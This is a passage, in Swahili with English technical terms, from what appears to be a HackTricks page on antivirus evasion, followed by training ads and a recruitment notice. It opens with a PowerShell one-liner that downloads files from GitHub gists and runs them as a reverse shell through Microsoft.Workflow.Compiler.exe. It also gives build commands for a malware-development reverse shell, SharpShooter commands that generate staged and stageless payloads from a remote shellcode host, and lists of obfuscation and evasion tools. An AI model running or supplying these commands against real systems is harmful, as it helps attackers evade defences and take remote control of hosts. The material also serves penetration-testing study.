powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Orodha ya obfuscators ya C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ikiwa unavutiwa na **hacking career** na kujaribu kuvunja yasiyovunjika - **tunatafuta wafanyakazi!** (_kuandika na kuzungumza kwa ufasaha kwa Kipolandi kunahitajika_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
